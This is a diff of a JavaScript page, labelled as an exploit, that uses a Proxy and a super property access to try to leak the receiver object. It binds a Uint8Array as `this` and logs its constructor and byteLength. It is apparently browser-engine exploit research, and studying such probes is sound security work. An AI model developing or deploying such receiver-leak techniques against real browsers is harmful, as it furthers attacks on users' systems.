@@ -29,28 +29,29 @@
 
         // Exploit 1: Leak a JS object via Proxy + super.prop
         function leakJSScope(obj) {
-            // Now extend Object so super.foo is legal
             class Leaker extends Object {
                 leak() {
                     return super.foo;
                 }
             }
 
-            // Intercept property access to grab the real `this`
             Leaker.prototype.__proto__ = new Proxy({}, {
                 get(target, prop, receiver) {
-                    logToDiv("[Leak] Receiver → " + receiver);
+                    // Instead of receiver.toString(), show constructor and byteLength
+                    logToDiv("[Leak] Receiver.constructor → " + receiver.constructor.name);
+                    if ('byteLength' in receiver) {
+                        logToDiv("[Leak] Receiver.byteLength → " + receiver.byteLength);
+                    }
                     return 1;
                 }
             });
 
             const foo = 42;
             const { leak } = Leaker.prototype;
-            // Bind our target object as `this`
             leak.call(obj);
         }
 
-        // Start the exploit on a typed array so we can see "[object Uint8Array]"
+        // Start the exploit on a TypedArray
         window.onload = function() {
             logToDiv("[*] Attempting to leak a Uint8Array as `this`…");
             leakJSScope(new Uint8Array(16));
